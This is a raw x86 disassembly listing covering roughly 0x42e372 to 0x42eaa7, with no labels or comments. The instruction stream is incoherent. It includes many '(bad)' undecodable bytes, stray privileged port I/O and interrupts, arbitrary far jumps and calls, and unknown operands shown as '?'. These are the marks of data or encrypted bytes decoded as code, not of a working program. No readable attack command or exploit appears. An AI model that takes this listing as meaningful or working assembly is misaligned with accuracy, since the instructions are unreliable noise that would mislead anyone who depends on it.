  42e372:	sub    al,0xf3
  42e374:	xchg   esi,eax
  42e375:	jno    0x42e3dd
  42e377:	ficomp WORD PTR [ecx]
  42e379:	cmc    
  42e37a:	in     eax,0xed
  42e37c:	mov    ebp,ecx
  42e37e:	and    BYTE PTR [edx-0x1b],ah
  42e381:	add    al,0xe3
  42e383:	aam    0x32
  42e385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e386:	sti    
  42e387:	cmp    DWORD PTR [ecx-0x66],edx
  42e38a:	(bad)  
  42e38b:	mov    ch,0x9e
  42e38d:	cmp    ah,BYTE PTR [edx-0x53be358f]
  42e393:	jbe    0x42e412
  42e395:	jb     0x42e355
  42e397:	inc    esp
  42e398:	in     eax,dx
  42e399:	pop    ecx
  42e39a:	push   ecx
  42e39b:	mov    ah,0x1c
  42e39d:	leave  
  42e39e:	shr    BYTE PTR [edi*1-0x659a08d8],cl
  42e3a5:	out    0x4a,eax
  42e3a7:	inc    edi
  42e3a8:	dec    ebx
  42e3a9:	out    0xbe,al
  42e3ab:	add    al,0xab
  42e3ad:	adc    DWORD PTR [edi+0x49],esi
  42e3b0:	(bad)  
  42e3b3:	out    dx,eax
  42e3b4:	(bad)  
  42e3b5:	stc    
  42e3b6:	sub    edx,ebx
  42e3b8:	mov    BYTE PTR [ecx+0x1c1a03b5],bh
  42e3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e3bf:	or     dh,bl
  42e3c1:	adc    al,0xcf
  42e3c3:	mov    edx,0x6abba43e
  42e3c8:	jmp    0xed18:0x5e4f5283
  42e3cf:	test   al,0xbf
  42e3d1:	test   al,0xb4
  42e3d3:	in     al,0x8c
  42e3d5:	dec    edi
  42e3d6:	lods   eax,DWORD PTR ds:[esi]
  42e3d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e3d9:	test   ch,bl
  42e3db:	push   esp
  42e3dc:	mov    ebp,DWORD PTR [eax-0x63b4c79d]
  42e3e2:	lods   eax,DWORD PTR ds:[esi]
  42e3e3:	fnstsw WORD PTR [esi]
  42e3e5:	pop    ebx
  42e3e6:	mov    dl,0x14
  42e3e8:	(bad)  
  42e3e9:	into   
  42e3ea:	xchg   edx,eax
  42e3eb:	(bad)  
  42e3ed:	or     al,0x6d
  42e3ef:	sti    
  42e3f0:	inc    ecx
  42e3f1:	jb     0x42e39f
  42e3f3:	pop    ebx
  42e3f4:	mov    ah,0x3e
  42e3f6:	in     al,dx
  42e3f7:	xor    esp,ecx
  42e3f9:	stc    
  42e3fa:	int3   
  42e3fb:	je     0x42e3d9
  42e3fd:	mov    edx,0xa1fb3dc2
  42e402:	mov    esi,0x354838da
  42e407:	xchg   DWORD PTR [edi],ebx
  42e409:	imul   esp,DWORD PTR [ebp+edi*8-0x446aafd5],0x339baa5b
  42e414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e415:	retf   
  42e416:	inc    edx
  42e417:	sahf   
  42e418:	mov    ah,0xe1
  42e41a:	mov    eax,0xe388e23c
  42e41f:	push   eax
  42e420:	push   ss
  42e421:	pop    esi
  42e422:	js     0x42e45a
  42e424:	and    al,0x2b
  42e426:	mov    eax,0xbba6d7c4
  42e42b:	(bad)  
  42e42c:	pusha  
  42e42d:	mov    bl,al
  42e42f:	dec    ecx
  42e430:	jg     0x42e4ac
  42e432:	pop    ds
  42e433:	sbb    esp,DWORD PTR [edi+0x6f64b35d]
  42e439:	mov    BYTE PTR [edx],dh
  42e43b:	lds    edx,FWORD PTR ds:0xb80f2ba8
  42e441:	mov    bh,0x32
  42e443:	sahf   
  42e444:	scas   eax,DWORD PTR es:[edi]
  42e445:	out    dx,eax
  42e446:	test   ah,dh
  42e448:	inc    ecx
  42e449:	ss mov ecx,0xe287fdf4
  42e44f:	adc    esp,ebp
  42e451:	fild   DWORD PTR [edi-0x16]
  42e454:	rol    bh,0x8e
  42e457:	jae    0x42e47e
  42e459:	jmp    0x36c773e
  42e45e:	mov    bl,0xd6
  42e460:	rcr    DWORD PTR [ecx+0x795cbbce],1
  42e466:	fisubr WORD PTR [ecx-0x39fb66dc]
  42e46c:	xchg   BYTE PTR [ecx+0x59],al
  42e46f:	mov    ah,0xd4
  42e471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e472:	jmp    0x42e421
  42e474:	push   ecx
  42e475:	and    BYTE PTR [ebx],bh
  42e477:	scas   al,BYTE PTR es:[edi]
  42e478:	aad    0xf8
  42e47a:	data16 mov bh,0x33
  42e47d:	mov    ecx,0x99dfbd
  42e482:	pop    esp
  42e483:	call   FWORD PTR ds:0x7de7ad3b
  42e489:	push   ebp
  42e48a:	lahf   
  42e48b:	mov    eax,0x22a4727e
  42e490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e491:	jmp    0x42e50c
  42e493:	out    dx,eax
  42e494:	ins    BYTE PTR es:[edi],dx
  42e495:	mov    esi,eax
  42e497:	clc    
  42e498:	int    0x79
  42e49a:	xchg   esi,eax
  42e49b:	ss stos BYTE PTR es:[edi],al
  42e49d:	shl    BYTE PTR [ecx-0x645b443c],0xf4
  42e4a4:	cmc    
  42e4a5:	mov    cl,0x9a
  42e4a7:	scas   al,BYTE PTR es:[edi]
  42e4a8:	les    esp,FWORD PTR ds:0x15935ae4
  42e4ae:	sub    esi,DWORD PTR [ebp-0x65898be9]
  42e4b4:	pushf  
  42e4b5:	cwde   
  42e4b6:	pop    ebp
  42e4b7:	cli    
  42e4b8:	mov    cl,0x9f
  42e4ba:	sbb    eax,DWORD PTR [edi]
  42e4bc:	pusha  
  42e4bd:	stc    
  42e4be:	pop    ds
  42e4bf:	popa   
  42e4c0:	xchg   esi,eax
  42e4c1:	rcl    dl,cl
  42e4c3:	fs pushf 
  42e4c5:	arpl   WORD PTR [edx],sp
  42e4c7:	and    eax,0xf8a65d19
  42e4cc:	rcr    DWORD PTR [edx+eax*8+0xf4a2115],1
  42e4d3:	jae    0x42e4f4
  42e4d5:	pop    ecx
  42e4d6:	inc    ebp
  42e4d7:	sar    DWORD PTR [ecx-0x79],1
  42e4da:	and    al,BYTE PTR [eax+0x36f56d06]
  42e4e0:	int    0x6c
  42e4e2:	adc    cl,BYTE PTR ds:0xf44ef00d
  42e4e8:	mov    ch,0x56
  42e4ea:	ficom  DWORD PTR [esi]
  42e4ec:	or     ebp,DWORD PTR [eax+0x7925a079]
  42e4f2:	mov    ah,0x57
  42e4f4:	or     edi,DWORD PTR [ecx+ebp*4-0x7463fe83]
  42e4fb:	mov    ebx,0x2f0807f0
  42e500:	clc    
  42e501:	sub    BYTE PTR es:[esi],cl
  42e504:	push   edx
  42e505:	inc    edx
  42e506:	leave  
  42e507:	add    al,0x6b
  42e509:	dec    edx
  42e50a:	jns    0x42e4da
  42e50c:	cli    
  42e50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e50e:	mov    ebx,0x17001a3a
  42e513:	and    al,0xd3
  42e515:	push   edx
  42e516:	pop    es
  42e517:	mov    ch,0x45
  42e519:	add    ecx,DWORD PTR [eax+0x7ae91a34]
  42e51f:	aam    0x85
  42e521:	fdiv   QWORD PTR ds:0x8b9a6ccd
  42e527:	fwait
  42e528:	popf   
  42e529:	or     ebp,esp
  42e52b:	ds inc edx
  42e52d:	icebp  
  42e52e:	and    bl,BYTE PTR gs:[ecx+0x79f4b1ae]
  42e535:	mul    edi
  42e537:	aad    0x28
  42e539:	jl     0x42e532
  42e53b:	sub    BYTE PTR [ebp-0x36],dl
  42e53e:	cmc    
  42e53f:	jmp    0xffc0:0x78d2bb77
  42e546:	and    eax,0x9a881a65
  42e54b:	pop    eax
  42e54c:	and    ebp,esi
  42e54e:	stos   DWORD PTR es:[edi],eax
  42e54f:	clc    
  42e550:	and    al,0x1f
  42e552:	shl    ebx,1
  42e554:	lods   eax,DWORD PTR ds:[esi]
  42e555:	add    BYTE PTR [edx-0x16],bl
  42e558:	push   ss
  42e559:	fld    st(4)
  42e55b:	add    eax,0xa916b540
  42e560:	inc    eax
  42e561:	mov    ebx,DWORD PTR [edi+0x78891b64]
  42e567:	repnz cld 
  42e569:	(bad)  
  42e56a:	out    dx,al
  42e56b:	sbb    DWORD PTR [edi],edx
  42e56d:	leave  
  42e56e:	clc    
  42e56f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e570:	int    0xdc
  42e572:	fisub  DWORD PTR [edi+eiz*2]
  42e575:	mov    ds,edi
  42e577:	pop    esp
  42e578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e579:	hlt    
  42e57a:	(bad)  
  42e57b:	retf   0x637a
  42e57e:	mov    ebp,0x97a49e6c
  42e583:	mov    ch,0x7b
  42e585:	jns    0x42e546
  42e587:	adc    al,0xfa
  42e589:	xor    eax,0xb8b53b14
  42e58e:	stos   DWORD PTR es:[edi],eax
  42e58f:	in     eax,dx
  42e590:	cwde   
  42e591:	push   cs
  42e592:	and    cl,BYTE PTR [esi+0x4028f91b]
  42e598:	std    
  42e599:	sti    
  42e59a:	xlat   BYTE PTR ds:[ebx]
  42e59b:	int3   
  42e59c:	or     DWORD PTR [ebx-0x5f7b9a6f],0xbe32b23b
  42e5a6:	cli    
  42e5a7:	jmp    0x5ad9:0xdd1d0161
  42e5ae:	mov    ebp,0x42cbfd78
  42e5b3:	jmp    0x42e5c5
  42e5b5:	mov    DWORD PTR [edi-0x419a00bd],eax
  42e5bb:	add    al,0x34
  42e5bd:	mov    ds:0xa0f44c66,eax
  42e5c2:	imul   eax,DWORD PTR [esi],0xffffffc8
  42e5c5:	inc    edi
  42e5c6:	jbe    0x42e638
  42e5c8:	pop    ebp
  42e5c9:	inc    ebp
  42e5ca:	and    esi,ebx
  42e5cc:	mov    esi,0x84a4c55e
  42e5d1:	cwde   
  42e5d2:	out    0x1,al
  42e5d4:	pop    ds
  42e5d5:	aaa    
  42e5d6:	and    DWORD PTR [esp+eax*4+0x2ad16ba7],0xffffff8d
  42e5de:	lea    edx,[edi+0x14]
  42e5e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5e2:	or     BYTE PTR [esi],dl
  42e5e4:	sbb    DWORD PTR [ecx],ebp
  42e5e6:	retf   0xdb7b
  42e5e9:	or     DWORD PTR [esi+edi*4+0x1d],ebx
  42e5ed:	fdivr  DWORD PTR [ebx]
  42e5ef:	in     al,dx
  42e5f0:	xchg   esi,eax
  42e5f1:	dec    ecx
  42e5f2:	fwait
  42e5f3:	mov    ebp,0x2da898
  42e5f8:	and    cl,bh
  42e5fa:	add    DWORD PTR [eax],ebp
  42e5fc:	aad    0x2
  42e5fe:	adc    al,0x41
  42e600:	mov    ecx,0x28021b9c
  42e605:	mov    edi,0x331d419
  42e60a:	imul   al
  42e60c:	jb     0x42e648
  42e60e:	imul   edi,DWORD PTR [eax],0x1b
  42e611:	sbb    DWORD PTR [esp+ebp*4-0x36352f6c],ecx
  42e618:	mov    WORD PTR [ecx+0x6f50a0fb],fs
  42e61e:	adc    BYTE PTR [ebx+0x3c5df2e0],ch
  42e624:	sbb    ch,ah
  42e626:	mov    edx,0x54cb9314
  42e62b:	dec    ecx
  42e62c:	(bad)  
  42e62d:	fwait
  42e62e:	and    BYTE PTR [ecx+esi*8],bl
  42e631:	into   
  42e632:	xor    BYTE PTR [ecx],ah
  42e634:	test   ebp,ebx
  42e636:	leave  
  42e637:	adc    dl,dh
  42e639:	nop
  42e63a:	enter  0x317a,0x20
  42e63e:	mov    dl,0x4
  42e640:	ret    
  42e641:	mov    esi,0x44258228
  42e646:	xchg   ebx,esi
  42e648:	add    DWORD PTR [ebx],0xd92feb49
  42e64e:	and    ecx,DWORD PTR [esi]
  42e650:	sti    
  42e651:	cmp    al,0x45
  42e653:	cmp    edi,edx
  42e655:	pop    eax
  42e656:	loopne 0x42e6d0
  42e658:	adc    eax,0x98f175ae
  42e65d:	leave  
  42e65e:	sbb    BYTE PTR [esi],bh
  42e660:	push   ss
  42e661:	fstp   DWORD PTR [edx-0x44]
  42e664:	xor    DWORD PTR [esi+edx*8-0x449fee91],ebx
  42e66b:	sub    ch,dh
  42e66d:	dec    eax
  42e66e:	xchg   ecx,eax
  42e66f:	jmp    0x9add:0xa42b5dc0
  42e676:	int    0x7f
  42e678:	and    DWORD PTR [ecx+0x37],ebx
  42e67b:	cmp    ah,BYTE PTR [eax-0x34]
  42e67e:	les    esi,FWORD PTR [eax-0x17ea325b]
  42e684:	mov    bh,0x22
  42e686:	dec    ecx
  42e687:	mov    edx,0x37d560ad
  42e68c:	xchg   ebx,eax
  42e68d:	xchg   ecx,eax
  42e68e:	mov    bh,0x34
  42e690:	cmp    ecx,eax
  42e692:	sbb    cl,cl
  42e694:	push   ebp
  42e695:	int    0xd0
  42e697:	clc    
  42e698:	mov    ecx,0x737a1962
  42e69d:	cmp    esp,eax
  42e69f:	and    eax,0x84badb57
  42e6a4:	adc    BYTE PTR [edx+ebx*1+0x2c7e3ec5],ch
  42e6ab:	icebp  
  42e6ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6ad:	sahf   
  42e6ae:	shl    BYTE PTR [ecx],0x7f
  42e6b1:	push   ds
  42e6b2:	mov    ah,0x8c
  42e6b4:	sbb    eax,0x1341ae9
  42e6b9:	fcom   DWORD PTR [ebx-0x136bda81]
  42e6bf:	outs   dx,DWORD PTR ds:[esi]
  42e6c0:	mov    dl,BYTE PTR [esi]
  42e6c2:	std    
  42e6c3:	out    0x95,eax
  42e6c5:	test   eax,0x575628b1
  42e6ca:	ja     0x42e704
  42e6cc:	sub    al,0xc6
  42e6ce:	mov    cl,0x24
  42e6d0:	adc    ah,BYTE PTR [edx+0x6b7c1093]
  42e6d6:	por    mm4,QWORD PTR ds:0xfc19cbb9
  42e6dd:	xchg   BYTE PTR [eax],dl
  42e6df:	outs   dx,DWORD PTR ds:[esi]
  42e6e0:	(bad)  
  42e6e2:	aaa    
  42e6e3:	ja     0x42e700
  42e6e5:	lds    ebp,FWORD PTR [ebp+edx*1-0x12]
  42e6e9:	hlt    
  42e6ea:	rcl    BYTE PTR [esi-0x79],1
  42e6ed:	frstor [esi+0x2c8825eb]
  42e6f3:	jle    0x42e685
  42e6f5:	adc    al,0x19
  42e6f7:	and    eax,0xf48b7a2d
  42e6fc:	sbb    BYTE PTR [ebx-0x71],bh
  42e6ff:	xor    ecx,edx
  42e701:	sub    al,0xb8
  42e703:	aam    0xc8
  42e705:	out    0xef,eax
  42e707:	mov    cl,0x95
  42e709:	enter  0xeef9,0x5e
  42e70d:	jb     0x42e768
  42e70f:	fist   WORD PTR [edi]
  42e711:	mov    DWORD PTR [ecx],edi
  42e713:	push   ebp
  42e714:	adc    ch,BYTE PTR [ebp-0x5c1b663e]
  42e71a:	sub    edi,DWORD PTR [ecx]
  42e71c:	mov    bh,0x80
  42e71e:	fist   WORD PTR [esi-0x570eb189]
  42e724:	ja     0x42e79d
  42e726:	mov    edi,0x3f17d854
  42e72b:	test   DWORD PTR ds:0x62f1f0cd,0x2a7dbe15
  42e735:	push   0x791afa09
  42e73a:	lds    ebx,FWORD PTR [esp-0x35]
  42e73e:	cmp    ch,BYTE PTR [edi+edx*4]
  42e741:	cmp    DWORD PTR [ebx+0x5a5448ab],0x506d1551
  42e74b:	call   0x8812b625
  42e750:	inc    ecx
  42e751:	stc    
  42e752:	xor    al,0xdc
  42e754:	mov    esi,0x5d292f01
  42e759:	adc    DWORD PTR [esi-0xf],edi
  42e75c:	(bad)  
  42e75d:	test   al,0x9b
  42e75f:	mov    dl,0xaf
  42e761:	mov    dh,BYTE PTR [edi*8+0x71a13a4b]
  42e768:	dec    ecx
  42e769:	les    esi,FWORD PTR [ecx+0x46]
  42e76c:	mov    dh,0x0
  42e76e:	mov    ebx,0xac88350c
  42e773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e774:	xor    ebx,DWORD PTR [ecx+0x2c50566]
  42e77a:	mov    ch,0x62
  42e77c:	in     al,dx
  42e77d:	jl     0x42e7b3
  42e77f:	push   edx
  42e780:	sbb    eax,0x77e74d7b
  42e785:	mov    ah,BYTE PTR [eax+0x3fe007b7]
  42e78b:	mov    ebx,0x4121c8e2
  42e790:	jne    0x42e723
  42e792:	lods   al,BYTE PTR ds:[esi]
  42e793:	in     al,dx
  42e794:	fimul  WORD PTR [edi+0x3c]
  42e797:	or     ch,al
  42e799:	stos   DWORD PTR es:[edi],eax
  42e79a:	cmp    ecx,DWORD PTR [eax]
  42e79c:	sbb    dl,BYTE PTR [esi]
  42e79e:	test   al,dl
  42e7a0:	push   es
  42e7a1:	test   al,0xa8
  42e7a3:	neg    ecx
  42e7a5:	stc    
  42e7a6:	stos   DWORD PTR es:[edi],eax
  42e7a7:	lods   eax,DWORD PTR ds:[esi]
  42e7a8:	outs   dx,DWORD PTR ds:[esi]
  42e7a9:	xor    DWORD PTR [edx-0x7ec6e348],0xb
  42e7b0:	or     ecx,eax
  42e7b2:	xlat   BYTE PTR ds:[ebx]
  42e7b3:	jnp    0x42e750
  42e7b5:	pop    ebp
  42e7b6:	lahf   
  42e7b7:	ins    BYTE PTR es:[edi],dx
  42e7b8:	pop    ds
  42e7b9:	loope  0x42e7ee
  42e7bb:	xor    ecx,DWORD PTR [ebp-0x1e18f13a]
  42e7c1:	pop    edx
  42e7c2:	pop    esp
  42e7c3:	or     DWORD PTR [ecx+ebp*1],esp
  42e7c6:	fistp  WORD PTR [ebx+eiz*2+0x38161b12]
  42e7cd:	mov    eax,0x59a553b8
  42e7d2:	test   esp,edi
  42e7d4:	sahf   
  42e7d5:	daa    
  42e7d6:	call   0xb25b2a9a
  42e7db:	outs   dx,BYTE PTR ds:[esi]
  42e7dc:	add    ecx,esi
  42e7de:	mov    ecx,0x293c65f4
  42e7e3:	add    eax,ebp
  42e7e5:	popa   
  42e7e6:	call   0x528:0x606847e7
  42e7ed:	mov    ebx,0x1a0f7725
  42e7f2:	push   esi
  42e7f3:	and    eax,DWORD PTR [ebx]
  42e7f5:	adc    BYTE PTR [ebx-0x7465630c],ah
  42e7fb:	pop    es
  42e7fc:	or     cl,BYTE PTR [edi-0x4f]
  42e7ff:	pusha  
  42e800:	ja     0x42e812
  42e802:	test   DWORD PTR cs:[esi-0x295b43af],ebp
  42e809:	sub    al,0xfd
  42e80b:	in     eax,dx
  42e80c:	leave  
  42e80d:	jno    0x42e867
  42e80f:	je     0x42e7d6
  42e811:	into   
  42e812:	jp     0x42e800
  42e814:	lahf   
  42e815:	sub    edx,edi
  42e817:	pop    esi
  42e818:	popf   
  42e819:	mov    esi,0x8e259dcc
  42e81e:	jecxz  0x42e811
  42e820:	xchg   ebp,eax
  42e821:	push   0x36
  42e823:	pop    ecx
  42e824:	inc    ebp
  42e825:	pop    ecx
  42e826:	jmp    0x6f765219
  42e82b:	inc    eax
  42e82c:	sbb    cl,BYTE PTR [ecx]
  42e82e:	shl    DWORD PTR [esi],0x68
  42e831:	mov    eax,ds:0x86919553
  42e836:	lods   eax,DWORD PTR ds:[esi]
  42e837:	out    dx,eax
  42e838:	xchg   edx,eax
  42e839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e83a:	pop    es
  42e83b:	xor    al,0x1
  42e83d:	loop   0x42e83d
  42e83f:	inc    esp
  42e840:	xchg   esp,eax
  42e841:	cmp    DWORD PTR ds:0x70b308da,ebx
  42e847:	xor    DWORD PTR [ebp+0x2e],esi
  42e84a:	mov    ecx,0x5947155d
  42e84f:	jmp    0x42e856
  42e851:	mov    ds:0x9923767d,eax
  42e856:	jle    0x42e89d
  42e858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e859:	repz das 
  42e85b:	ins    BYTE PTR es:[edi],dx
  42e85c:	pop    ebx
  42e85d:	data16 std 
  42e85f:	hlt    
  42e860:	(bad)  
  42e862:	shl    bl,0xcc
  42e865:	fwait
  42e866:	adc    DWORD PTR [edx+0x30],0xffffffa4
  42e86a:	dec    edx
  42e86b:	aas    
  42e86c:	xchg   ebx,eax
  42e86d:	inc    ecx
  42e86e:	mov    bh,0x94
  42e870:	adc    edx,ecx
  42e872:	hlt    
  42e873:	sbb    ah,BYTE PTR [esi+0x7e]
  42e876:	mov    BYTE PTR [ebp+0x22],dh
  42e879:	pop    ecx
  42e87a:	mov    ah,0x82
  42e87c:	outs   dx,DWORD PTR ds:[esi]
  42e87d:	jl     0x42e880
  42e87f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e880:	out    dx,al
  42e881:	dec    esp
  42e882:	mov    ebx,0xe1e2eb64
  42e887:	mov    eax,0xf2c675d5
  42e88c:	sbb    DWORD PTR [edi-0x57],edi
  42e88f:	push   0x1
  42e891:	jp     0x42e8a1
  42e893:	jge    0x42e846
  42e895:	mov    ds:0x613fa3a7,eax
  42e89a:	pop    ecx
  42e89b:	jge    0x42e8e5
  42e89d:	sbb    BYTE PTR [ecx+0x51fe3568],cl
  42e8a3:	std    
  42e8a4:	fwait
  42e8a5:	pop    eax
  42e8a6:	fwait
  42e8a7:	pop    ds
  42e8a8:	xchg   ebx,eax
  42e8a9:	dec    edx
  42e8aa:	inc    esi
  42e8ab:	jae    0x42e86f
  42e8ad:	mov    ecx,0x7c4204bd
  42e8b2:	xchg   edx,ecx
  42e8b4:	mov    bh,0xa
  42e8b6:	mov    ds,WORD PTR [esi+0x65]
  42e8b9:	pop    es
  42e8ba:	(bad)  
  42e8bc:	push   cs
  42e8bd:	stc    
  42e8be:	out    0xb,al
  42e8c0:	ds in  eax,dx
  42e8c2:	mov    ebp,0xe9036f54
  42e8c7:	inc    eax
  42e8c8:	inc    ebp
  42e8c9:	out    0x66,al
  42e8cb:	hlt    
  42e8cc:	popa   
  42e8cd:	jne    0x42e875
  42e8cf:	ins    BYTE PTR es:[edi],dx
  42e8d0:	mov    ?,WORD PTR [ecx+0x37]
  42e8d3:	cmp    BYTE PTR [ecx+edx*8],bl
  42e8d6:	jbe    0x42e8ff
  42e8d8:	xchg   ebx,eax
  42e8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e8da:	mov    esi,0x7fedd5d4
  42e8df:	out    dx,al
  42e8e0:	cmp    ch,BYTE PTR [esi]
  42e8e2:	nop
  42e8e3:	push   0x6644b91b
  42e8e8:	addr16 (bad) 
  42e8ea:	mov    esi,0xc883d8c
  42e8ef:	loopne 0x42e928
  42e8f1:	iret   
  42e8f2:	or     edx,DWORD PTR [esi+ebp*8]
  42e8f5:	inc    ebx
  42e8f6:	mov    dh,0x94
  42e8f8:	test   BYTE PTR [ebx],cl
  42e8fa:	xchg   bp,ax
  42e8fc:	sbb    ecx,edi
  42e8fe:	(bad)  
  42e8ff:	jae    0x42e8ff
  42e901:	dec    esi
  42e902:	sbb    eax,0x6a718535
  42e907:	icebp  
  42e908:	in     eax,dx
  42e909:	xor    al,0x1b
  42e90b:	jo     0x42e92a
  42e90d:	mov    ebp,ecx
  42e90f:	lahf   
  42e910:	sub    BYTE PTR [esi],dl
  42e912:	sub    al,0xa
  42e914:	dec    esp
  42e915:	jne    0x42e996
  42e917:	pop    edx
  42e918:	out    0xe2,al
  42e91a:	inc    ebx
  42e91b:	mov    ebp,DWORD PTR [ecx+0x1de7decd]
  42e921:	sbb    bl,BYTE PTR [ebp-0x42e8bbcd]
  42e927:	test   BYTE PTR [eax+0x35f50762],dl
  42e92d:	pushf  
  42e92e:	(bad)  
  42e92f:	in     al,dx
  42e930:	sub    BYTE PTR [edi],dh
  42e932:	or     BYTE PTR [edi],al
  42e934:	sub    ecx,DWORD PTR [ecx+0x11]
  42e937:	sub    ebp,DWORD PTR [edx]
  42e939:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e93b:	fs (bad) 
  42e93d:	daa    
  42e93e:	ins    DWORD PTR es:[edi],dx
  42e93f:	div    ebp
  42e941:	loope  0x42e982
  42e943:	hlt    
  42e944:	sahf   
  42e945:	leave  
  42e946:	add    edx,DWORD PTR [eax]
  42e948:	mov    eax,ds:0x2c683150
  42e94d:	hlt    
  42e94e:	mov    bl,0x24
  42e950:	in     eax,0x42
  42e952:	add    esp,DWORD PTR [edx]
  42e954:	lds    ebx,FWORD PTR [esp+eiz*4-0x6]
  42e958:	add    BYTE PTR [edi-0x1c],ch
  42e95b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e95c:	sar    DWORD PTR [edi-0x54],cl
  42e95f:	repz shl BYTE PTR [edx],1
  42e962:	mov    edi,0xe22baaf4
  42e967:	and    al,BYTE PTR [edi+0x76ad1043]
  42e96d:	jns    0x42e97c
  42e96f:	add    dl,BYTE PTR [ebx+eiz*4]
  42e972:	mov    ecx,0x31a9177b
  42e977:	jns    0x42e927
  42e979:	or     al,0x4f
  42e97b:	lods   eax,DWORD PTR ds:[esi]
  42e97c:	pop    ds
  42e97d:	jle    0x42e91b
  42e97f:	dec    eax
  42e980:	adc    edx,ebx
  42e982:	rcl    DWORD PTR [esi+0x7ebe1532],0x17
  42e989:	jns    0x42e97b
  42e98b:	stos   DWORD PTR es:[edi],eax
  42e98c:	out    dx,al
  42e98d:	hlt    
  42e98e:	mov    dh,ah
  42e990:	mov    ebx,fs
  42e992:	mov    esi,DWORD PTR [edx-0x43dafc3c]
  42e998:	push   ecx
  42e999:	jg     0x42e96a
  42e99b:	jmp    0x42e9bc
  42e99d:	leave  
  42e99e:	js     0x42e92c
  42e9a0:	stos   DWORD PTR es:[edi],eax
  42e9a1:	mov    al,ds:0x9b62c265
  42e9a6:	dec    ebx
  42e9a7:	mov    edi,0x332ac1de
  42e9ac:	ja     0x42e9e0
  42e9ae:	in     al,dx
  42e9af:	mov    al,ds:0xda3f6b67
  42e9b4:	jne    0x42e9dc
  42e9b6:	repz call 0xbb5eefe0
  42e9bc:	jne    0x42e953
  42e9be:	shl    ah,0xba
  42e9c1:	mov    WORD PTR [edi+0x77705613],?
  42e9c7:	sub    al,0x35
  42e9c9:	mov    bh,0xbc
  42e9cb:	mov    ah,0x27
  42e9cd:	push   esi
  42e9ce:	push   ss
  42e9cf:	int    0xd5
  42e9d1:	popa   
  42e9d2:	popa   
  42e9d3:	repz (bad) 
  42e9d6:	jns    0x42e9eb
  42e9d8:	and    BYTE PTR [ecx-0x30bbd8e9],ch
  42e9de:	in     eax,0xd7
  42e9e0:	lods   eax,DWORD PTR ds:[esi]
  42e9e1:	cdq    
  42e9e2:	sbb    edi,DWORD PTR [ecx-0x4259c0db]
  42e9e8:	cmp    edi,DWORD PTR [ebp+0x12]
  42e9eb:	and    dh,BYTE PTR [esi+0x62]
  42e9ee:	ret    0xb694
  42e9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9f2:	or     BYTE PTR [edi-0x3],0x3
  42e9f6:	xor    edx,DWORD PTR [edx]
  42e9f8:	aad    0x9d
  42e9fa:	pop    esi
  42e9fb:	hlt    
  42e9fc:	aad    0x28
  42e9fe:	test   edi,0x94d5091d
  42ea04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea05:	push   edx
  42ea06:	or     eax,0x1ba02ea6
  42ea0b:	mov    edx,0xe369b0e7
  42ea10:	adc    al,BYTE PTR ds:0xa2108a9a
  42ea16:	in     eax,dx
  42ea17:	add    al,0x36
  42ea19:	into   
  42ea1a:	xchg   ebx,eax
  42ea1b:	cmp    eax,0x64ef32d4
  42ea20:	aad    0x69
  42ea22:	mov    ecx,?
  42ea24:	cmp    esi,DWORD PTR [esi-0x76e2cb3a]
  42ea2a:	sbb    eax,0xf4dfa551
  42ea2f:	cmp    ah,ch
  42ea31:	lahf   
  42ea32:	jnp    0x42ea95
  42ea34:	cdq    
  42ea35:	pop    esi
  42ea36:	mov    ecx,0x1849417e
  42ea3b:	into   
  42ea3c:	pop    ds
  42ea3d:	jmp    0xcb9446b0
  42ea42:	add    DWORD PTR [esi],0xfffffffe
  42ea45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea46:	cmp    eax,DWORD PTR [edx]
  42ea48:	jle    0x42ea83
  42ea4a:	mov    BYTE PTR [edi+0x147fc994],dl
  42ea50:	xchg   ebx,eax
  42ea51:	xor    ah,ah
  42ea53:	xchg   esp,eax
  42ea54:	ficomp DWORD PTR [ebp-0x63d4a2cc]
  42ea5a:	fwait
  42ea5b:	jmp    0x42ea4f
  42ea5d:	pop    esp
  42ea5e:	inc    esi
  42ea5f:	js     0x42ea7c
  42ea61:	dec    esp
  42ea62:	ins    BYTE PTR es:[edi],dx
  42ea63:	outs   dx,BYTE PTR ds:[esi]
  42ea64:	dec    esi
  42ea65:	adc    DWORD PTR [esi+0x1ef7a5d5],ebp
  42ea6b:	out    dx,al
  42ea6c:	mov    ss,WORD PTR [ebp-0x34]
  42ea6f:	dec    edx
  42ea70:	cmp    eax,0x202e36f7
  42ea75:	xchg   ebp,eax
  42ea76:	stos   BYTE PTR es:[edi],al
  42ea77:	xor    eax,0x826130a2
  42ea7c:	xor    DWORD PTR [edx+edi*4],eax
  42ea7f:	pop    es
  42ea80:	xor    esp,DWORD PTR [esi+0x622d6ebb]
  42ea86:	or     DWORD PTR [esp+ebx*8],edx
  42ea89:	inc    ecx
  42ea8a:	std    
  42ea8b:	popf   
  42ea8c:	and    bh,dh
  42ea8e:	mov    edi,0x66741d04
  42ea93:	push   esi
  42ea94:	and    eax,0xfeeaecf7
  42ea99:	mov    edx,DWORD PTR [edi-0x62]
  42ea9c:	and    cl,BYTE PTR [ecx]
  42ea9e:	daa    
  42ea9f:	jmp    0x10a0e0d6
  42eaa4:	ds into 
  42eaa6:	pop    esi
  42eaa7:	imul   ebx,DWORD PTR [ebp-0x5b],0xffffffe1
